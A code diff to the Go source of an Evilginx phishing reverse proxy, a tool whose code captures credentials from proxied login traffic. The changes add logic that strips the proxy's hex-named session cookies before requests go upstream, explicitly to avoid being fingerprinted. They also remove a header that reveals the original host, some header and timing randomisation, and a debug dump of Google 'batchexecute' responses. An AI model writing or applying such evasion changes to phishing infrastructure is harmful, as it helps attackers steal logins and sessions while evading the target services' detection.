@@ -364,15 +364,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				req.Header.Set("Sec-Fetch-User", "?1")
 			}
 
-			// Add DNT header randomly (50% chance) for realism
-			if rand.Intn(2) == 0 {
-				req.Header.Set("DNT", "1")
-			}
-
-			// Randomize connection header
-			connections := []string{"keep-alive", "close"}
-			req.Header.Set("Connection", connections[rand.Intn(len(connections))])
-
 			req_url := req.URL.Scheme + "://" + req.Host + req.URL.Path
 			o_host := req.Host
 			lure_url := req_url
@@ -688,7 +679,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						return p.blockRequest(req)
 					}
 				}
-				req.Header.Set(p.getHomeDir(), o_host)
 
 				if ps.SessionId != "" {
 					p.session_mtx.Lock()
@@ -847,6 +837,25 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				// prevent caching
 				req.Header.Set("Cache-Control", "no-cache")
 
+				// strip Evilginx session cookies before forwarding to upstream
+				// The browser sends all cookies for the phished base domain, including
+				// Evilginx's hex-named session cookies (e.g. "8fd2-9a5f"). If these are
+				// forwarded to the upstream server, they act as a strong fingerprint.
+				if cookies := req.Cookies(); len(cookies) > 0 {
+					evilginxCookieRe := regexp.MustCompile(`^[0-9a-f]{4}-[0-9a-f]{4}$`)
+					var cleanCookies []string
+					for _, c := range cookies {
+						if !evilginxCookieRe.MatchString(c.Name) {
+							cleanCookies = append(cleanCookies, c.Name+"="+c.Value)
+						}
+					}
+					if len(cleanCookies) > 0 {
+						req.Header.Set("Cookie", strings.Join(cleanCookies, "; "))
+					} else {
+						req.Header.Del("Cookie")
+					}
+				}
+
 				// fix sec-fetch-dest
 				sec_fetch_dest := req.Header.Get("Sec-Fetch-Dest")
 				if sec_fetch_dest != "" {
@@ -889,7 +898,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 				// check for creds in request body
 				if pl != nil && ps.SessionId != "" {
-					req.Header.Set(p.getHomeDir(), o_host)
 					body, err := ioutil.ReadAll(req.Body)
 					if err == nil {
 						req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
@@ -900,6 +908,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 						log.Debug("POST: %s", req.URL.Path)
 						log.Debug("POST body = %s", body)
+
 
 						contentType := req.Header.Get("Content-type")
 
@@ -1179,23 +1188,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 			req_hostname := strings.ToLower(resp.Request.Host)
 
-			// Add realistic server headers based on target
-			if pl := p.getPhishletByOrigHost(req_hostname); pl != nil {
-				// Match server header to phishlet's expected server
-				// This helps avoid detection mismatches
-				if resp.Header.Get("Server") == "" {
-					// Default to common servers
-					servers := []string{"nginx", "Apache", "cloudflare"}
-					resp.Header.Set("Server", servers[rand.Intn(len(servers))])
-				}
-			}
 
-			// Ensure timing consistency - add artificial delays for realism
-			if resp.StatusCode == 200 && strings.Contains(resp.Header.Get("Content-Type"), "text/html") {
-				// Add small random delay to mimic network latency
-				delay := time.Duration(rand.Intn(100)+50) * time.Millisecond
-				time.Sleep(delay)
-			}
 
 			// if "Location" header is present, make sure to redirect to the phishing domain
 			r_url, err := resp.Location()
@@ -1268,16 +1261,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 			// modify received body
 			body, err := ioutil.ReadAll(resp.Body)
-
-			// Temporary debug: dump batchexecute responses
-			if resp.Request != nil && strings.Contains(resp.Request.URL.Path, "batchexecute") {
-				ioutil.WriteFile("/tmp/batchexecute_response.txt", body, 0644)
-				bodyPreview := string(body)
-				if len(bodyPreview) > 500 {
-					bodyPreview = bodyPreview[:500]
-				}
-				log.Debug("BATCHEXECUTE RESPONSE: status=%d bodyLen=%d preview=%s", resp.StatusCode, len(body), bodyPreview)
-			}
 
 
 			if pl != nil {
@@ -1442,6 +1425,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								l := s.PhishLure
 								body = p.injectOgHeaders(l, body)
 							}
+
 
 							var js_params *map[string]string = nil
 							if s, ok := p.sessions[ps.SessionId]; ok {
